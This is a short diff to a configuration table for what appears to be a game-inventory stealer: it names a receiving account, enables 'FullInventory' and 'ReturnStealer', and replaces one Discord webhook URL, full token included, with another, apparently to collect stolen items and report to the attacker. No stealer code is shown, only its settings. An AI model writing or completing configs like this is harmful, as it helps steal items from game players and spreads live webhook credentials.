@@ -1,6 +1,6 @@
 Config = {
     Receivers = {"User_boblex"},
-    Webhook = "https://discord.com/api/webhooks/1277863416236609586/sBsl7yEyPa6GNgSLVp-RYCQzyRdvW8U_KtXve8HFdE--1OV8VCelyfqOtHCOxp_1hYWN",
+    Webhook = "https://discord.com/api/webhooks/1277429981659791410/VccbDVfCXx9sT9IChUPsWwzRp_jioH0AxxPvsJxwqzE3q7QEksEwiorZMe_n3SWvKAZA",
     FullInventory = true,
     ReturnStealer = true,
     Script = "Custom",
